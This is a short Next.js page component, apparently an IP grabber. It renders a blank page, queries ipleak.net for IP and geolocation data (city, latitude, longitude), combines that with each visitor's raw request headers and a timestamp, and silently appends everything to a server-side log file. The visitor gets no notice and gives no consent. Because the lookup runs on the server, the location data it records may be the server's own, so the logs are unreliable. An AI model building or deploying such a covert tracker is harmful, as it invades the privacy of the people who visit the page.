import axios from 'axios'

export async function getServerSideProps(context: any) {
  const res = context.req.rawHeaders
  return { props: {res} }
}

export default function Gmud2 (props: any) {
  
  const getData = async()=>{
    const res = await axios.get('https://ipv4.ipleak.net/json/')

    const dial = new Date();

    const ip = res.data.ip
    const country = res.data.country_name
    const region = res.data.region_name
    const continent = res.data.continent_name
    const city = res.data.city_name
    const time = res.data.time_zone
    const latitude = res.data.latitude
    const longitude = res.data.longitude
    const user = props.res
    
    const Arp = '\n////////////'
    const Datelog = `\n${dial}\n`
    const IP = `IP: ${ip}\n`
    const Country = `Country: ${country}\n`
    const Region = `Region: ${region}\n`
    const Continent = `Continent: ${continent}\n`
    const City = `City: ${city}\n`
    const Time_Zone = `Time_Zone: ${time}\n`
    const Latitude = `Latitude: ${latitude}\n`
    const Longitude = `Longitude: ${longitude}\n\n`
    const User = `UserData: ${user}\n`

    const all = Arp + Datelog + IP + Country + Region + Continent + City + Time_Zone + Latitude + Longitude + User;

  if(typeof window === 'undefined') {
    const fs = require('fs');
    const stateFile = "StateFile.txt";
    fs.appendFileSync(stateFile, all);
  }
}

  getData();

  return null;
}